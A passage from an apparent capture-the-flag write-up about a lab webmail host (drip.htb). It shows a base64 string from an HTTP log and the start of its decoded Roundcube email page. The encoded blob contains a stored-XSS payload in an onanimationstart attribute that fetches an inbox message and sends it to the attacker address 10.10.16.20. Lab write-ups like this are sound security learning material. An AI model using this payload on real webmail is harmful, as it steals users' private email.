PSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ21hcmsnLCdyZWFkJyx0aGlzLGV2ZW50KSI+QXMgcmVhZDwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9InVucmVhZCBkaXNhYmxlZCIgaWQ9InJjbWJ0bjEyMSIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnbWFyaycsJ3VucmVhZCcsdGhpcyxldmVudCkiPkFzIHVucmVhZDwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9ImZsYWcgZGlzYWJsZWQiIGlkPSJyY21idG4xMjIiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ21hcmsnLCdmbGFnZ2VkJyx0aGlzLGV2ZW50KSI+QXMgZmxhZ2dlZDwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9InVuZmxhZyBkaXNhYmxlZCIgaWQ9InJjbWJ0bjEyMyIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnbWFyaycsJ3VuZmxhZ2dlZCcsdGhpcyxldmVudCkiPkFzIHVuZmxhZ2dlZDwvYT48L2xpPgoJCQoJCQoJPC91bD4KPC9kaXY+CgoKCgkJPC9kaXY+CgkKCTxkaXYgY2xhc3M9ImNvbnRlbnQgZnJhbWUtY29udGVudCIgcm9sZT0ibWFpbiI+CgkJPGRpdiBpZD0ibWVzc2FnZS1oZWFkZXIiPgoJCQk8aDIgY2xhc3M9InN1YmplY3QiPgoJCQkJPHNwYW4gY2xhc3M9InZvaWNlIj5TdWJqZWN0OiA8L3NwYW4+CgkJCQlDdXN0b21lciBJbmZvcm1hdGlvbiBSZXF1ZXN0CgkJCQkKCQkJPC9oMj4KCQkJPGRpdiBjbGFzcz0iaGVhZGVyIj4KCQkJCTxpbWcgc3JjPSIvP190YXNrPWFkZHJlc3Nib29rJmFtcDtfYWN0aW9uPXBob3RvJmFtcDtfZW1haWw9a3VqZW4lNDBkcmlwLmh0YiZhbXA7X2Vycm9yPTEmYW1wO19iZ2NvbG9yPXRyYW5zcGFyZW50IiBhbHQ9IkNvbnRhY3QgcGhvdG8iIGNsYXNzPSJjb250YWN0cGhvdG8iIG9uZXJyb3I9InRoaXMub25lcnJvciA9IG51bGw7IHRoaXMuc3JjID0gJ3NraW5zL2VsYXN0aWMvaW1hZ2VzL2NvbnRhY3RwaWMuc3ZnJzsiPgoJCQkJPGRpdiBjbGFzcz0iaGVhZGVyLWNvbnRlbnQiPgoJCQkJCTxkaXYgY2xhc3M9ImhlYWRlci1zdW1tYXJ5Ij48c3Bhbj5Gcm9tIDxzcGFuIGNsYXNzPSJhZHIiPjxhIGhyZWY9Im1haWx0bzprdWplbkBkcmlwLmh0YiIgY2xhc3M9InJjbUNvbnRhY3RBZGRyZXNzIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2NvbXBvc2UnLCdrdWplbiAmbHQ7a3VqZW5AZHJpcC5odGImZ3Q7Jyx0aGlzKSIgdGl0bGU9Imt1amVuQGRyaXAuaHRiIj5rdWplbjwvYT48YSBocmVmPSIjYWRkIiB0aXRsZT0iQWRkIHRvIGFkZHJlc3MgYm9vayIgY2xhc3M9InJjbWFkZGNvbnRhY3QiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnYWRkLWNvbnRhY3QnLCdrdWplbiAmbHQ7a3VqZW5AZHJpcC5odGImZ3Q7Jyx0aGlzKSI+PC9hPjwvc3Bhbj4gb24gPHNwYW4gY2xhc3M9InRleHQtbm93cmFwIj4yMDI1LTAyLTEzIDEyOjMwPC9zcGFuPjwvc3Bhbj48L2Rpdj4KCQkJCQk8dGFibGUgY2xhc3M9ImhlYWRlci1oZWFkZXJzIj48dGJvZHk+PHRyPjx0ZCBjbGFzcz0iaGVhZGVyLXRpdGxlIj5Gcm9tPC90ZD48dGQgY2xhc3M9ImhlYWRlciBmcm9tIj48c3BhbiBjbGFzcz0iYWRyIj48YSBocmVmPSJtYWlsdG86a3VqZW5AZHJpcC5odGIiIGNsYXNzPSJyY21Db250YWN0QWRkcmVzcyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdjb21wb3NlJywna3VqZW4gJmx0O2t1amVuQGRyaXAuaHRiJmd0OycsdGhpcykiIHRpdGxlPSJrdWplbkBkcmlwLmh0YiI+a3VqZW48L2E+PGEgaHJlZj0iI2FkZCIgdGl0bGU9IkFkZCB0byBhZGRyZXNzIGJvb2siIGNsYXNzPSJyY21hZGRjb250YWN0IiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ2FkZC1jb250YWN0Jywna3VqZW4gJmx0O2t1amVuQGRyaXAuaHRiJmd0OycsdGhpcykiPjwvYT48L3NwYW4+PC90ZD48L3RyPjx0cj48dGQgY2xhc3M9ImhlYWRlci10aXRsZSI+VG88L3RkPjx0ZCBjbGFzcz0iaGVhZGVyIHRvIj48c3BhbiBjbGFzcz0iYWRyIj48YSBocmVmPSJtYWlsdG86YmNhc2VAZHJpcC5odGIiIGNsYXNzPSJyY21Db250YWN0QWRkcmVzcyIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdjb21wb3NlJywnYmNhc2VAZHJpcC5odGInLHRoaXMpIiB0aXRsZT0iYmNhc2VAZHJpcC5odGIiPmJjYXNlQGRyaXAuaHRiPC9hPjxhIGhyZWY9IiNhZGQiIHRpdGxlPSJBZGQgdG8gYWRkcmVzcyBib29rIiBjbGFzcz0icmNtYWRkY29udGFjdCIgb25jbGljaz0icmV0dXJuIHJjbWFpbC5jb21tYW5kKCdhZGQtY29udGFjdCcsJ2JjYXNlQGRyaXAuaHRiJyx0aGlzKSI+PC9hPjwvc3Bhbj48L3RkPjwvdHI+PHRyPjx0ZCBjbGFzcz0iaGVhZGVyLXRpdGxlIj5SZXBseS1UbzwvdGQ+PHRkIGNsYXNzPSJoZWFkZXIgcmVwbHl0byI+PHNwYW4gY2xhc3M9ImFkciI+PGEgaHJlZj0ibWFpbHRvOmt1amVuQGRyaXAuaHRiIiBjbGFzcz0icmNtQ29udGFjdEFkZHJlc3MiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnY29tcG9zZScsJ2t1amVuQGRyaXAuaHRiJyx0aGlzKSIgdGl0bGU9Imt1amVuQGRyaXAuaHRiIj5rdWplbkBkcmlwLmh0YjwvYT48YSBocmVmPSIjYWRkIiB0aXRsZT0iQWRkIHRvIGFkZHJlc3MgYm9vayIgY2xhc3M9InJjbWFkZGNvbnRhY3QiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnYWRkLWNvbnRhY3QnLCdrdWplbkBkcmlwLmh0YicsdGhpcykiPjwvYT48L3NwYW4+PC90ZD48L3RyPjx0cj48dGQgY2xhc3M9ImhlYWRlci10aXRsZSI+RGF0ZTwvdGQ+PHRkIGNsYXNzPSJoZWFkZXIgZGF0ZSI+VG9kYXkgMTI6MzA8L3RkPjwvdHI+PC90Ym9keT48L3RhYmxlPgoJCQkJCTxkaXYgY2xhc3M9ImhlYWRlci1saW5rcyI+CgkJCQkJCQoJCQkJCQkKCQkJCQkJPGEgaHJlZj0iI2hlYWRlcnMiIGNsYXNzPSJoZWFkZXJzLXN1bW1hcnkiIG9uY2xpY2s9InJldHVybiBVSS5oZWFkZXJzX3Nob3codHJ1ZSkiPjwvYT4KCQkJCQkJPGEgaHJlZj0iI2FsbC1oZWFkZXJzIiBjbGFzcz0iaGVhZGVycy1hbGwiIG9uY2xpY2s9InJldHVybiBVSS5oZWFkZXJzX2RpYWxvZygpIj5IZWFkZXJzPC9hPgoJCQkJCQkKCQkJCQkJCgkJCQkJCQk8YSBjbGFzcz0icGxhaW4iIHRpdGxlPSJEaXNwbGF5IGluIHBsYWluIHRleHQgZm9ybWF0IiBpZD0icmNtYnRuMTI0IiByb2xlPSJidXR0b24iIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnY2hhbmdlLWZvcm1hdCcsJ3RleHQnLHRoaXMsZXZlbnQpIj48c3BhbiBjbGFzcz0iaW5uZXIiPlBsYWluIHRleHQ8L3NwYW4+PC9hPgoJCQkJCQkKCQkJCQkJCgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9kaXY+CgkJPGRpdiBpZD0ibWVzc2FnZS1jb250ZW50Ij4KCQkJPGRpdiBjbGFzcz0ibGVmdGNvbCIgcm9sZT0icmVnaW9uIiBhcmlhLWxhYmVsbGVkYnk9ImFyaWEtbGFiZWwtbWVzc2FnZWF0dGFjaG1lbnRzIj4KCQkJCTxoMiBpZD0iYXJpYS1sYWJlbC1tZXNzYWdlYXR0YWNobWVudHMiIGNsYXNzPSJ2b2ljZSI+QXR0YWNobWVudHM8L2gyPgoJCQkJCgkJCTwvZGl2PgoJCQk8ZGl2IGNsYXNzPSJyaWdodGNvbCIgcm9sZT0icmVnaW9uIiBhcmlhLWxhYmVsbGVkYnk9ImFyaWEtbGFiZWwtbWVzc2FnZWJvZHkiPgoJCQkJPGgyIGlkPSJhcmlhLWxhYmVsLW1lc3NhZ2Vib2R5IiBjbGFzcz0idm9pY2UiPk1lc3NhZ2UgQm9keTwvaDI+CgkJCQk8ZGl2IGlkPSJtZXNzYWdlLW9iamVjdHMiPgo8ZGl2IGlkPSJyZW1vdGUtb2JqZWN0cy1tZXNzYWdlIiBjbGFzcz0ibm90aWNlIiBzdHlsZT0iZGlzcGxheTogbm9uZSI+PHNwYW4+VG8gcHJvdGVjdCB5b3VyIHByaXZhY3kgcmVtb3RlIHJlc291cmNlcyBoYXZlIGJlZW4gYmxvY2tlZC48L3NwYW4+Jm5ic3A7PHNwYW4gY2xhc3M9ImJveGJ1dHRvbnMiPjxhIGhyZWY9IiNsb2FkcmVtb3RlIiBvbmNsaWNrPSJyY21haWwuY29tbWFuZCgnbG9hZC1yZW1vdGUnKSI+QWxsb3c8L2E+PC9zcGFuPjwvZGl2Pgo8L2Rpdj4KCQkJCTxkaXYgaWQ9Im1lc3NhZ2Vib2R5Ij48ZGl2IGNsYXNzPSJtZXNzYWdlLWh0bWxwYXJ0IiBpZD0ibWVzc2FnZS1odG1scGFydDEiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiBmb28iPjwhLS0gaHRtbCBpZ25vcmVkIC0tPjwhLS0gaGVhZCBpZ25vcmVkIC0tPjwhLS0gbWV0YSBpZ25vcmVkIC0tPjxkaXYgY2xhc3M9InJjbUJvZHkiIHRpdGxlPSIgbmFtZT0iYmFyIHN0eWxlPWFuaW1hdGlvbi1uYW1lOnByb2dyZXNzLWJhci1zdHJpcGVzIG9uYW5pbWF0aW9uc3RhcnQ9ZmV0Y2goJiMwMzk7Lz9fdGFzaz1tYWlsJmFtcDtfYWN0aW9uPXNob3cmYW1wO191aWQ9MyZhbXA7X21ib3g9SU5CT1gmYW1wO19leHR3aW49MSYjMDM5OykudGhlbihyPSZndDtyLnRleHQoKSkudGhlbih0PSZndDtmZXRjaChgaHR0cDovLzEwLjEwLjE2LjIwL2M9JHtidG9hKHQpfWApKSAgZm9vPWJhciI+Rm9vPC9kaXY+CgoKCgoKCgoKCkNvbmZpZGVudGlhbGl0eSBOb3RpY2U6IFRoaXMgZWxlY3Ryb25pYyBjb21tdW5pY2F0aW9uIG1heSBjb250YWluIGNvbmZpZGVudGlhbCBvciBwcml2aWxlZ2VkIGluZm9ybWF0aW9uLiBBbnkgdW5hdXRob3JpemVkIHJldmlldywgdXNlLCBkaXNjbG9zdXJlLCBjb3B5aW5nLCBkaXN0cmlidXRpb24sIG9yIHRha2luZyBvZiBhbnkgcGFydCBvZiB0aGlzIGVtYWlsIGlzIHN0cmljdGx5IHByb2hpYml0ZWQuCklmIHlvdSBzdXNwZWN0IHRoYXQgeW91J3ZlIHJlY2VpdmVkIGEgJnF1b3Q7cGhpc2hpbmcmcXVvdDsgZS1tYWlsLCBwbGVhc2UgZm9yd2FyZCB0aGUgZW50aXJlIGVtYWlsIHRvIG91ciBzZWN1cml0eSBlbmdpbmVlciBhdCBiY2FzZUBkcmlwLmh0YjwvZGl2PjwvZGl2PgoJCQk8L2Rpdj4KCQk8L2Rpdj4KCTwvZGl2Pgo8L2Rpdj4KCjwhLS0gcG9wdXAgbWVudXMgLS0+CjxkaXYgaWQ9ImF0dGFjaG1lbnRtZW51IiBjbGFzcz0icG9wdXBtZW51Ij4KCTxoMyBpZD0iYXJpYS1sYWJlbC1hdHRhY2htZW50bWVudSIgY2xhc3M9InZvaWNlIj5BdHRhY2htZW50IG9wdGlvbnM8L2gzPgoJPHVsIGNsYXNzPSJtZW51IGxpc3RpbmciIHJvbGU9Im1lbnUiIGFyaWEtbGFiZWxsZWRieT0iYXJpYS1sYWJlbC1hdHRhY2htZW50bWVudSI+CgkJPGxpIHJvbGU9Im1lbnVpdGVtIj48YSBpZD0iYXR0YWNobWVudW9wZW4iIGNsYXNzPSJleHR3aW4gZGlzYWJsZWQiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIiBvbmNsaWNrPSJyZXR1cm4gcmNtYWlsLmNvbW1hbmQoJ29wZW4tYXR0YWNobWVudCcsJycsdGhpcyxldmVudCkiPk9wZW48L2E+PC9saT4KCQk8bGkgcm9sZT0ibWVudWl0ZW0iPjxhIGlkPSJhdHRhY2htZW51ZG93bmxvYWQiIGNsYXNzPSJkb3dubG9hZCBkaXNhYmxlZCIgcm9sZT0iYnV0dG9uIiB0YWJpbmRleD0iLTEiIGFyaWEtZGlzYWJsZWQ9InRydWUiIGhyZWY9IiMiIG9uY2xpY2s9InJldHVybiByY21haWwuY29tbWFuZCgnZG93bmxvYWQtYXR0YWNobWVudCcsJycsdGhpcyxldmVudCkiPkRvd25sb2FkPC9hPjwvbGk+CgkJCgk8L3VsPgo8L2Rpdj4KCjxkaXYgaWQ9Im1haWx0by1tZW51IiBjbGFzcz0icG9wdXBtZW51Ij4KCTxoMyBpZD0iYXJpYS1sYWJlbC1tYWlsdG9tZW51IiBjbGFzcz0idm9pY2UiPkVtYWlsIGFkZHJlc3Mgb3B0aW9uczwvaDM+Cgk8dWwgY2xhc3M9Im1lbnUgbGlzdGluZyIgcm9sZT0ibWVudSIgYXJpYS1sYWJlbGxlZGJ5PSJhcmlhLWxhYmVsLW1haWx0b21lbnUiPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9ImFkZHJlc3Nib29rIiBpZD0icmNtYnRuMTI1IiByb2xlPSJidXR0b24iIHRhYmluZGV4PSItMSIgYXJpYS1kaXNhYmxlZD0idHJ1ZSIgaHJlZj0iIyI+QWRkIHRvIGFkZHJlc3MgYm9vazwvYT48L2xpPgoJCTxsaSByb2xlPSJtZW51aXRlbSI+PGEgY2xhc3M9ImNvbXBvc2UiIGlkPSJyY21idG4xMjYiIHJvbGU9ImJ1dHRvbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBocmVmPSIjIj5Db21wb3NlIG1haWwgdG88L2E+PC9saT4KCQkKCTwvdWw+CjwvZGl2PgoKCjwvZGl2PgoKCgo8ZGl2IGlkPSJtZXNzYWdlc3RhY2siPjwvZGl2Pgo8c2NyaXB0PgokKGZ1bmN0aW9uKCkgewpyY21haWwuaW5pdCgpOwp9KTsKPC9zY3JpcHQ+CgoKCjxzY3JpcHQgc3JjPSJza2lucy9lbGFzdGljL2RlcHMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanM/cz0xNzE2MTA3MjQ1Ij48L3NjcmlwdD4KPHNjcmlwdCBzcmM9InNraW5zL2VsYXN0aWMvdWkubWluLmpzP3M9MTcxNjEwNzIzNyI+PC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4= HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure></div>

<p>It decodes to:</p>
<details>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;&lt;title&gt;DripMail Webmail :: Customer Information Request&lt;/title&gt;</span><br><span class="line">	&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0&quot;</span>&gt;&lt;meta name=<span class="string">&quot;theme-color&quot;</span> content=<span class="string">&quot;#f4f4f4&quot;</span>&gt;&lt;meta name=<span class="string">&quot;msapplication-navbutton-color&quot;</span> content=<span class="string">&quot;#f4f4f4&quot;</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">link</span> rel=<span class="string">&quot;shortcut icon&quot;</span> href=<span class="string">&quot;skins/elastic/images/favicon.ico?s=1716107237&quot;</span>&gt;</span><br><span class="line">	&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;skins/elastic/deps/bootstrap.min.css?s=1716107245&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">		&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;skins/elastic/styles/styles.min.css?s=1716107237&quot;</span>&gt;</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">		&lt;script&gt;</span><br><span class="line">		try &#123;</span><br><span class="line">			<span class="keyword">if</span> (document.cookie.indexOf(<span class="string">&#x27;colorMode=dark&#x27;</span>) &gt; -1</span><br><span class="line">				|| (document.cookie.indexOf(<span class="string">&#x27;colorMode=light&#x27;</span>) === -1 &amp;&amp; window.matchMedia(<span class="string">&#x27;(prefers-color-scheme: dark)&#x27;</span>).matches)</span><br><span class="line">			) &#123;</span><br><span class="line">				document.documentElement.className += <span class="string">&#x27; dark-mode&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; catch (e) &#123; &#125;</span><br><span class="line">		&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;<span class="built_in">link</span> rel=<span class="string">&quot;stylesheet&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1716107237&quot;</span>&gt;&lt;script src=<span class="string">&quot;program/js/jquery.min.js?s=1716107242&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;program/js/common.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;&lt;script src=<span class="string">&quot;program/js/app.min.js?s=1716107237&quot;</span>&gt;&lt;/script&gt;&lt;script&gt;</span><br><span class="line">/*</span><br><span class="line">        @licstart  The following is the entire license notice <span class="keyword">for</span> the </span><br><span class="line">        JavaScript code <span class="keyword">in</span> this page.</span><br><span class="line"></span><br><span class="line">        Copyright (C) The Roundcube Dev Team</span><br><span class="line"></span><br><span class="line">        The JavaScript code <span class="keyword">in</span> this page is free software: you can redistribute</span><br><span class="line">        it and/or modify it under the terms of the GNU General Public License</span><br><span class="line">        as published by the Free Software Foundation, either version 3 of</span><br><span class="line">        the License, or (at your option) any later version.</span><br><span class="line"></span><br><span class="line">        The code is distributed WITHOUT ANY WARRANTY; without even the implied</span><br><span class="line">        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">        See the GNU GPL <span class="keyword">for</span> more details.</span><br><span class="line"></span><br><span class="line">        @licend  The above is the entire license notice</span><br><span class="line">        <span class="keyword">for</span> the JavaScript code <span class="keyword">in</span> this page.</span><br><span class="line">*/</span><br><span class="line">var rcmail = new rcube_webmail();</span><br><span class="line">rcmail.set_env(&#123;<span class="string">&quot;task&quot;</span>:<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;standard_windows&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;locale&quot;</span>:<span class="string">&quot;en_US&quot;</span>,<span class="string">&quot;devel_mode&quot;</span>:null,<span class="string">&quot;rcversion&quot;</span>:10607,<span class="string">&quot;cookie_domain&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;cookie_path&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;cookie_secure&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;dark_mode_support&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;skin&quot;</span>:<span class="string">&quot;elastic&quot;</span>,<span class="string">&quot;extwin&quot;</span>:1,<span class="string">&quot;blankpage&quot;</span>:<span class="string">&quot;skins/elastic/watermark.html&quot;</span>,<span class="string">&quot;refresh_interval&quot;</span>:10,<span class="string">&quot;session_lifetime&quot;</span>:600,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;show&quot;</span>,<span class="string">&quot;comm_path&quot;</span>:<span class="string">&quot;/?_task=mail&quot;</span>,<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;twZLggeBqoXLUfNK&quot;</span>,<span class="string">&quot;compose_extwin&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;date_format&quot;</span>:<span class="string">&quot;yy-mm-dd&quot;</span>,<span class="string">&quot;date_format_localized&quot;</span>:<span class="string">&quot;YYYY-MM-DD&quot;</span>,<span class="string">&quot;browser_capabilities&quot;</span>:&#123;<span class="string">&quot;pdf&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;flash&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;tiff&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;webp&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;pgpmime&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;,<span class="string">&quot;uid&quot;</span>:<span class="string">&quot;3&quot;</span>,<span class="string">&quot;safemode&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;message_context&quot;</span>:null,<span class="string">&quot;message_flags&quot;</span>:[<span class="string">&quot;seen&quot;</span>],<span class="string">&quot;sender&quot;</span>:<span class="string">&quot;kujen \u003Ckujen@drip.htb\u003E&quot;</span>,<span class="string">&quot;mailbox&quot;</span>:<span class="string">&quot;INBOX&quot;</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;bcase&quot;</span>,<span class="string">&quot;permaurl&quot;</span>:<span class="string">&quot;/?_task=mail&amp;_action=show&amp;_uid=3&amp;_mbox=INBOX&quot;</span>,<span class="string">&quot;has_writeable_addressbook&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;delimiter&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;mimetypes&quot;</span>:[<span class="string">&quot;text/plain&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span 